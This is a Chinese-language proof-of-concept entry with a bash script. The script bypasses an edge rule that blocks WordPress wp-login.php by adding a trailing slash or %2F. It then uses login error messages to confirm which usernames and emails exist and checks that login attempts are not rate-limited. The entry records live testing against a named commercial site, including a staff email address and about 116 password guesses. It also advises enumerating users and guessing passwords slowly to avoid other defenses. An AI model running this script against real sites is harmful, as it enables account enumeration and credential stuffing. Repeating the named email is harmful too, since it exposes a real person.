# WordPress wp-login.php 精确路径 403 被尾斜杠/%2F 绕过：登录与找回密码匿名可达 + 用户名/邮箱存在性 oracle + 登录端点无限速

- **code**: wordpress-wp-login-php-403-trailing-slash-bypass-login-oracl
- **kind**: poc
- **category**: auth-bypass
- **component**: WordPress（子目录部署，如 /blog；前置 nginx/CDN 对 /wp-login.php 做精确匹配 403）
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: finding_id=135（task#6，finding_checks.verdict=verified，findings.status=confirmed）。2026-11-11 于 ARTEX 执行机（Linux bash + curl，浏览器 UA）对 https://www.greenmangaming.com/blog/ 实测并复跑脚本：① GET /blog/wp-login.php → 403|0B|text/plain；② GET /blog/wp-login.php/ → 200|8250B|text/html，正文含 name="log" 与 name="pwd"；③ POST 到 /blog/wp-login.php/（带 test cookie）→ 200 + "Error: The username zzqnotexist_991 is not registered on this site."；同一路径 log=blog → "Error: The password you entered for the username blog is incorrect."；log=flynn.abbott@greenmangaming.com → "Error: The password you entered for the email address ... is incorrect."（2026-11-11 复验仍一致）；④ 累计约 116 次不同账号×口令尝试全部 HTTP 200 登录错误页，无 429/锁定/验证码，未命中任何口令（阴性）；⑤ 变体矩阵复验：%2F、%2f 同样 200 命中，/wp-login.php/?action=lostpassword → 200|4195B，而 ?action=lostpassword（无尾斜杠）→ 403，//、/.、/./、/x/.. 在 --path-as-is 下均 406；盲测 /. 得到的 200 已确认是 curl 客户端归一化造成的假阳性。⑥ 对照组：wp-admin/ 与 xmlrpc.php 的同族变体（大小写、%2e%2f、分号、双编码、路径穿越、Host 改写、X-Original-URL）全部仍 403/406/421，仅 wp-login 存在该缺口。据此判定「边缘精确匹配 403 被尾斜杠绕过 → 认证面匿名可达 + 存在性 oracle + 无限速」成立。
- **path**: pocs/wordpress-wp-login-php-403-trailing-slash-bypass-login-oracl/wp_login_slash_poc.sh
- **tags**: wordpress, wp-login.php, 403-bypass, trailing-slash, path-normalization, username-enumeration, email-enumeration, no-rate-limit, credential-stuffing, nginx, auth-validate-control
- **created_at**: 2026-11-11T17:47:11.203Z
- **engine**: https://www.greenmangaming.com/blog/wp-login.php/

## 描述

边缘/nginx 用精确匹配（字面路径或 `=` 修饰）把 `/wp-login.php` 直接 403（0 字节 text/plain）时，路径归一化只在服务端做：请求 `/wp-login.php/`（或 `%2F` 编码斜杠）不再命中该精确串，被正常转发给 PHP，WordPress 自己路由出登录表单 —— 于是本应被边缘规则整体封死的认证面（登录 + 找回密码）对公网匿名完全可达。POST 到该路径会真实执行口令校验，而 WordPress 默认错误文案区分「用户名/邮箱不存在」与「密码错误」，构成存在性 oracle；且默认无登录限速、无账户锁定、无验证码，可无限做口令验证与凭据喷洒。适用面：WP 装在子目录（/blog、/wp、/wordpress）、规则只覆盖精确路径、未装登录限速/2FA 类插件。边界：wp-admin/、xmlrpc.php 的同族变体（大小写、%2e%2f、分号、双编码、路径穿越、Host 改写、X-Original-URL）在该形态下仍是 403/406/421，不要浪费时间；`//` 与 `/.` 在服务端是 406，若测出 200 多半是 curl 客户端把 `/.` 归一化掉了（必须 --path-as-is 复验）。本条未拿到口令（116 次尝试未命中），只证明入口可达 + oracle + 无限重试。

## 用法

```
bash wp_login_slash_poc.sh https://host/blog            # 只验入口与 oracle
bash wp_login_slash_poc.sh https://host/blog "$UA" blog  # 第3参数=已枚举到的存在用户名，用来验证 exists 分支
走代理：export HTTPS_PROXY=http://127.0.0.1:PORT（脚本内 req() 也可加 -x）。

三段式判据（缺一不算命中）：
 1) GET {BASE}/wp-login.php        → 403 | 0B | text/plain（规则命中的证据，不是"不存在"）
 2) GET {BASE}/wp-login.php/       → 200 | ~8KB | text/html，grep 到 name="log" 且 name="pwd"
 3) POST 到【尾斜杠路径】→ 文案分叉：
    不存在 → "Error: The username <X> is not registered on this site."
    用户名存在 → "Error: The password you entered for the username <X> is incorrect."
    邮箱存在   → "Error: The password you entered for the email address <X> is incorrect."
 4) 连续 10 次错口令全 200、无 429/锁定/验证码 → 无限重试成立。

关键前置：POST 前必须先 GET {BASE}/wp-login.php/ 用 -c 存 jar 拿 wordpress_test_cookie，并带 testcookie=1，否则回 "Cookies are blocked or not supported."。
变体矩阵（--path-as-is 下实测）：/wp-login.php/ = 200 命中；%2F、%2f = 200 命中；/?action=lostpassword = 200/4195B 找回密码表单；?action=lostpassword（无尾斜杠）= 403；//、/.、/./、/x/.. = 406。
拿到入口后：先用 /wp-json/wp/v2/users?per_page=100 或 ?author=N 枚举真实用户名，再做低频口令验证；同一账号高频尝试会触发站点侧其他风控，建议单线程 ≥1s 间隔。
```

## 正文

```
#!/usr/bin/env bash
# =============================================================================
# WordPress wp-login.php：精确路径 403 防护被「尾斜杠 / %2F」绕过
#   → 登录 + 找回密码对匿名可达；登录错误文案构成 用户名/邮箱 存在性 oracle；
#     登录端点无速率限制、无锁定、无验证码 → 可无限做口令验证 / 凭据喷洒
#
# 适用面：WordPress 子目录部署（例：/blog），前置 nginx / CDN 边缘规则只对
#         "/wp-login.php" 做精确匹配（403 + text/plain + 0 字节），却放行带尾斜杠
#         的变体。判定是三段式，缺一不可：
#           A. 精确路径 403 / 0B
#           B. 尾斜杠 200 + HTML 里真有 name="log" 与 name="pwd"
#           C. POST 到【尾斜杠路径】能进入口令校验（错误文案可区分用户是否存在）
#
# 用法：
#   bash wp_login_slash_poc.sh https://host/blog
#   bash wp_login_slash_poc.sh https://host/blog "<浏览器UA>"
#   走代理：export HTTPS_PROXY=http://127.0.0.1:PORT   （或给 req() 加 -x）
#
# 判据（实测回显）：
#   GET  $BASE/wp-login.php                    -> 403 | 0 B | text/plain
#   GET  $BASE/wp-login.php/                   -> 200 | ~8 KB | text/html，含 name="log" / name="pwd"
#   GET  $BASE/wp-login.php%2F                 -> 200 | ~8 KB（等价变体，需 --path-as-is）
#   GET  $BASE/wp-login.php/?action=lostpassword -> 200 | ~4 KB 找回密码表单
#   反例：GET $BASE/wp-login.php?action=lostpassword  -> 仍 403/0B（query 不能绕，只有路径后缀能绕）
#   反例：GET $BASE/wp-login.php//  与  /wp-login.php/.  -> 406/0B（--path-as-is 下）；
#         不带 --path-as-is 时 curl 会把 "/." 归一化成 "/" 而得到 200，是假的，别当绕过。
#   POST 不存在用户名 -> "Error: The username <X> is not registered on this site."
#   POST 存在用户名   -> "Error: The password you entered for the username <X> is incorrect."
#   POST 存在邮箱     -> "Error: The password you entered for the email address <X> is incorrect."
#
# 常见失败原因：
#   1) 直接 POST 不带 test cookie -> "Cookies are blocked or not supported."（必须先 GET 取 cookie）
#   2) 把 403 当「端点不存在」    -> 假阴性；403 本身就是规则命中的证据
#   3) 只改大小写 / 编码不加尾斜杠 -> wp-admin、xmlrpc.php 的同族变体实测仍 403/406/421，只有 wp-login 有这个缺口
#   4) 裸 curl UA 打 CDN 前置      -> 可能被边缘加严，带浏览器 UA
#   5) 200 但正文不是登录页        -> 可能是缓存 / 软 404；必须 grep name="log" 与 name="pwd"
#   6) 用 ?query 或 %3F 去「绕」    -> 无效，实测 /wp-login.php?action=lostpassword/ 仍 403；
#                                    规则匹配的是路径，必须改路径（尾斜杠 / %2F）
#   7) 用 // 或 /. 当绕过          -> 服务端 406；看上去 200 是因为 curl 客户端把 /. 归一化掉了，
#                                    复验必须加 --path-as-is（否则假阳性）
#
# 说明：本脚本只做「入口可达性 + oracle + 无限重试」的验证，不内置字典，
#       也不声称能拿到口令（本条目来源目标 116 次尝试全部失败，口令尝试未命中）。
# =============================================================================
set -u

BASE="${1:?usage: $0 https://host/<wp-subdir> [UA]}"; BASE="${BASE%/}"
UA="${2:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36}"
JAR="$(mktemp)"; trap 'rm -f "$JAR"' EXIT
P="$BASE/wp-login.php"
V="$P/"                      # 绕过变体：尾斜杠（等价变体：把 / 写成 %2F，需 --path-as-is）

req() { curl -sk --max-time 25 -A "$UA" "$@"; }
code() { req -o /dev/null -w '%{http_code}|%{size_download}|%{content_type}\n' "$@"; }

echo "== [0] 基线：精确路径应被边缘规则拦成 403/0B =="
echo -n "   GET $P   -> "; code "$P"

echo "== [1] 绕过：尾斜杠应 200 且是登录表单 =="
echo -n "   GET $V   -> "; code "$V"
BODY="$(req "$V")"
if printf '%s' "$BODY" | grep -q 'name="log"' && printf '%s' "$BODY" | grep -q 'name="pwd"'; then
  echo "   [OK] 表单存在：name=\"log\" + name=\"pwd\""
else
  echo "   [FAIL] 未取到登录表单（看是否被缓存页 / 软 404 / WAF 挑战页替换）"
fi

echo "== [2] 变体矩阵：只有「路径后缀」能绕，query 和归一化变体都不行 =="
variant() {  # $1=url  $2=期望(body grep 关键字)
  b="$(req --path-as-is "$1" -w '\n__CODE__%{http_code}' 2>/dev/null)"
  c="${b##*__CODE__}"; body="${b%__CODE__*}"
  if [ -n "$2" ] && printf '%s' "$body" | grep -q "$2"; then t="[HIT] 命中"; else t="[-]   无"; fi
  echo "   $t  $c  $1"
}
variant "${P}/"                'name="pwd"'      # 真绕过：尾斜杠
variant "${P}%2F"              'name="pwd"'      # 真绕过：编码斜杠
variant "${P}%2f"              'name="pwd"'
variant "${P}/?action=lostpassword" 'name="user_login"'   # 找回密码表单（字段是 user_login）
variant "${P}?action=lostpassword" ''                       # 反例：405/403，query 绕不过去
variant "${P}//"              ''                  # 反例：406
variant "${P}/."              ''                  # 反例：406（不带 --path-as-is 时 curl 会自己归一化成 /"./"→"/"，假 200）
variant "${P}/./"             ''
variant "${P}/x/.."           ''
echo "   ↑ 判据：只有 200 且 grep 到 name=\"pwd\"(登录) / name=\"user_login\"(找回密码) 才算命中；"
echo "     用 curl 不带 --path-as-is 测 /. 或 // 会得到客户端归一化后的假 200，必须 --path-as-is 复验。"

echo "== [3] 取 wordpress_test_cookie（POST 的前置条件）=="
req -c "$JAR" -o /dev/null "$V"
if grep -q wordpress_test_cookie "$JAR"; then echo "   [OK] cookie jar 已拿到 wordpress_test_cookie"; else echo "   [WARN] 未拿到 test cookie，POST 可能回 'Cookies are blocked'"; fi

echo "== [4] 用户名 oracle：不存在 vs 存在 =="
probe() {  # $1=log  $2=pwd
  req -b "$JAR" -c "$JAR" -X POST "$V" \
      --data-urlencode "log=$1" --data "pwd=$2&wp-submit=Log+In&testcookie=1&redirect_to=$BASE/wp-admin/" \
    | grep -oE 'Error: [^<]*|<strong>[^<]*</strong>[^<]*' | head -n2
}
NONEXIST="zzq_notexist_$(date +%s)"
echo "   [4a] 不存在用户 $NONEXIST :"; probe "$NONEXIST" 'ZzqWrong!42'
if [ $# -ge 3 ]; then
  echo "   [4b] 已枚举候选用户 $3 :"; probe "$3" 'ZzqWrong!42'
else
  echo "   [4b] 跳过（没有已知存在的用户名）；先用 /wp-json/wp/v2/users 或 ?author=N 枚举后再传第 3 个参数"
fi
echo "   判据：'is not registered on this site' = 不存在；'password you entered for the username ... is incorrect' = 存在（且口令校验真实执行）"

echo "== [4c] 邮箱 oracle（可选）=="
echo "   把 log= 换成 user@domain：存在邮箱回 '...for the email address ... is incorrect'"
echo "   不存在邮箱预期为 'Unknown email address...'（该分支复用前先自测一次校准，勿直接当判据）"

echo "== [5] 找回密码面（同一绕过路径，可选）=="
echo -n "   GET $V?action=lostpassword -> "; code "$V?action=lostpassword"

echo "== [6] 速率限制 / 锁定 / 验证码探测（低频，10 次）=="
i=0; hit=0
while [ $i -lt 10 ]; do
  i=$((i+1))
  out="$(req -b "$JAR" -X POST "$V" --data-urlencode "log=zzq_ratelimit_probe" --data "pwd=ZzqWrong$i!&wp-submit=Log+In&testcookie=1" -w '\n__CODE__%{http_code}|%{size_download}')"
  c="${out##*__CODE__}"; body="${out%__CODE__*}"
  if [ "${c%%|*}" != "200" ] || printf '%s' "$body" | grep -qiE 'too many|locked|rate limit|captcha|try again later'; then
    echo "   [STOP] 第 $i 次出现限速/锁定特征：$c"; hit=1; break
  fi
  sleep 1
done
[ $hit -eq 0 ] && echo "   [HIT] 10 次连续错误口令均为 200、无限速/锁定/验证码 → 可无限重试（扩大样本时注意保持低频）"

echo "== 完成。结论三选一 =="
echo "   403 仍 403 → 该站无此缺口（或尾斜杠被 301 到 403）"
echo "   200 无表单 → 假命中（缓存/软 404）"
echo "   200 有表单 + oracle 文案分叉 + 无限速 → 成立，可进入口令验证（务必先确认真实授权与尝试上限）"
```
